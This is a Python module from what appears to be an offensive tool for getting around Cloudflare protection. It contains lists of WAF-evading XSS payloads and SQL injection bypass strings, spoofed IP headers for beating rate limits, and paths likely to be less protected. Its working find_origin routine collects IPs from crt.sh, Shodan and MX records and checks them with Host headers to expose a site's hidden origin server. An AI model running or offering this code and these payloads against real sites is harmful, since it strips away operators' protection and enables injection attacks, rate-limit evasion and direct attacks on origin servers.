"""Cloudflare-specific bypass techniques and origin IP discovery."""
from __future__ import annotations
import asyncio
import re
from typing import Any
import httpx
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console

log = get_logger(__name__)

# Known Cloudflare IP ranges (abbreviated — full list at https://www.cloudflare.com/ips/)
CLOUDFLARE_IP_RANGES = [
 "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
 "104.16.0.0/13", "104.24.0.0/14", "108.162.192.0/18",
 "131.0.72.0/22", "141.101.64.0/18", "162.158.0.0/15",
 "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
 "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
]

CF_XSS_BYPASSES = [
 "<details/open/ontoggle=alert(1)>",
 "<svg><animatetransform onbegin=alert(1)>",
 "<img src onerror=alert(1)>",
 "<img\rsrc=x\ronerror=alert(1)>",
 "<script>onerror=alert;throw 1</script>",
 "<svg><set attributename=onmouseover value=alert(1)>",
 "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
 "<!--<img src=--><img src=x onerror=alert(1)//>",
 "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
 "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
 "<iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'>",
 "<input autofocus onfocus=alert(1)>",
]

CF_SQLI_BYPASSES = [
 "1.0e1 OR 1=1",
 "1/*!50000UNION*//*!50000SELECT*/1,2,3--",
 "1 UnIoN SeLeCt 1,2,3--",
 "1%09UNION%09ALL%09SELECT%091,2,3--",
 "1 OR 0x1=0x1",
 "1 OR 1 LIKE 1",
 "1 OR 1 REGEXP 1",
 "1 OR 1 BETWEEN 0 AND 2",
 "1%2520UNION%2520SELECT%25201",
 "1/**/UNION/**/SELECT/**/1,2,3",
 "1 UNION ALL SELECT NULL--",
 "1' OR 1=1 LIMIT 1--",
]

CF_RATE_LIMIT_BYPASS_HEADERS = [
 {"X-Forwarded-For": "127.0.0.1"},
 {"CF-Connecting-IP": "1.1.1.1"},
 {"X-Real-IP": "127.0.0.1"},
 {"True-Client-IP": "127.0.0.1"},
 {"X-Client-IP": "127.0.0.1"},
 {"X-Originating-IP": "127.0.0.1"},
 {"Forwarded": "for=127.0.0.1"},
]

# Paths commonly set to lower security level in Cloudflare Page Rules
CF_LOW_SECURITY_PATHS = [
 "/cdn-cgi/", "/wp-json/", "/api/", "/xmlrpc.php",
 "/wp-cron.php", "/?feed=rss2", "/graphql", "/rest/",
 "/.well-known/", "/robots.txt", "/sitemap.xml",
]


async def _crtsh_ips(domain: str, client: TalismanHTTPClient) -> list[str]:
 ips: list[str] = []
 try:
  r = await client.get(
   f"https://crt.sh/?q={domain}&output=json", timeout=20
  )
  if r.status_code == 200:
   ip_re = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
   ips.extend(ip_re.findall(r.text))
 except Exception:
  pass
 return list(set(ips))


async def _shodan_ips(domain: str, api_key: str, client: TalismanHTTPClient) -> list[str]:
 ips: list[str] = []
 if not api_key:
  return ips
 try:
  r = await client.get(
   f"https://api.shodan.io/dns/domain/{domain}?key={api_key}", timeout=15
  )
  if r.status_code == 200:
   data = r.json()
   for entry in data.get("data", []):
    if "value" in entry:
     ip_re = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
     matches = ip_re.findall(entry["value"])
     ips.extend(matches)
 except Exception:
  pass
 return list(set(ips))


async def _mx_ips(domain: str) -> list[str]:
 """MX records often not behind Cloudflare."""
 import aiodns
 resolver = aiodns.DNSResolver()
 ips: list[str] = []
 try:
  mx_records = await resolver.query(domain, "MX")
  for mx in mx_records:
   try:
    a_records = await resolver.query(str(mx.host), "A")
    ips.extend(r.host for r in a_records)
   except Exception:
    pass
 except Exception:
  pass
 return ips


async def _verify_origin(domain: str, ip: str, client: TalismanHTTPClient) -> bool:
 """Send request to IP with Host header — check if it responds like the target."""
 for scheme in ("https", "http"):
  try:
   r = await client.get(
    f"{scheme}://{ip}/",
    headers={"Host": domain},
    timeout=8,
   )
   # If we get a response with typical site content, likely origin
   if r.status_code < 500 and len(r.text) > 100:
    # Check it's not a Cloudflare error page
    if "cloudflare" not in r.text.lower() and "cf-ray" not in str(r.headers).lower():
     return True
  except Exception:
   pass
 return False


async def find_origin(
 target: str,
 proxy: str | None = None,
 shodan_key: str | None = None,
 **kwargs: Any,
) -> dict[str, Any]:
 domain = target.replace("https://", "").replace("http://", "").split("/")[0]
 console.print(f"\n[module][+] Cloudflare Origin Finder[/module] -> [target]{domain}[/target]")

 candidates: list[str] = []
 confirmed: list[str] = []

 async with TalismanHTTPClient(proxy=proxy, timeout=20) as client:
  tasks = [
   _crtsh_ips(domain, client),
   _mx_ips(domain),
  ]
  if shodan_key:
   tasks.append(_shodan_ips(domain, shodan_key, client))

  results = await asyncio.gather(*tasks, return_exceptions=True)
  for result in results:
   if isinstance(result, list):
    candidates.extend(result)

  # Filter out Cloudflare IPs
  import ipaddress
  cf_nets = []
  for cidr in CLOUDFLARE_IP_RANGES:
   try:
    cf_nets.append(ipaddress.ip_network(cidr))
   except Exception:
    pass

  non_cf_candidates: list[str] = []
  for ip in set(candidates):
   try:
    addr = ipaddress.ip_address(ip)
    if not any(addr in net for net in cf_nets):
     non_cf_candidates.append(ip)
   except Exception:
    pass

  console.print(f" {len(non_cf_candidates)} non-Cloudflare candidate IPs — verifying...")

  verify_tasks = [_verify_origin(domain, ip, client) for ip in non_cf_candidates[:20]]
  verify_results = await asyncio.gather(*verify_tasks, return_exceptions=True)

  for ip, is_origin in zip(non_cf_candidates[:20], verify_results):
   if is_origin is True:
    confirmed.append(ip)
    console.print(f" [success][+] Origin IP found: {ip}[/success]")

 if not confirmed:
  console.print(" [dim]No confirmed origin IPs found via automated methods[/dim]")

 return {
  "domain": domain,
  "candidates": non_cf_candidates,
  "confirmed_origins": confirmed,
  "origin_found": len(confirmed) > 0,
 }


def get_xss_bypasses() -> list[str]:
 return CF_XSS_BYPASSES


def get_sqli_bypasses() -> list[str]:
 return CF_SQLI_BYPASSES


def get_rate_limit_bypass_headers() -> list[dict[str, str]]:
 return CF_RATE_LIMIT_BYPASS_HEADERS


def get_low_security_paths() -> list[str]:
 return CF_LOW_SECURITY_PATHS
